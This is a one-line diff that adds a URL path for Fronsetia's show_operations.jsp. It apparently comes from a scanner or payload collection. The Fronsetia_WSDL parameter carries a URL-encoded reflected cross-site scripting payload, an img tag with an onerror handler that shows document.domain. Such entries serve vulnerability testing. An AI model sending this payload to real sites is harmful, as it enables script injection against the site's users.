@@ -1,0 +1,1 @@
+/show_operations.jsp?Fronsetia_WSDL=%22%3E%3Cimg%2Bsrc%3Dx%20onerror%3Dalert(document.domain)%3E
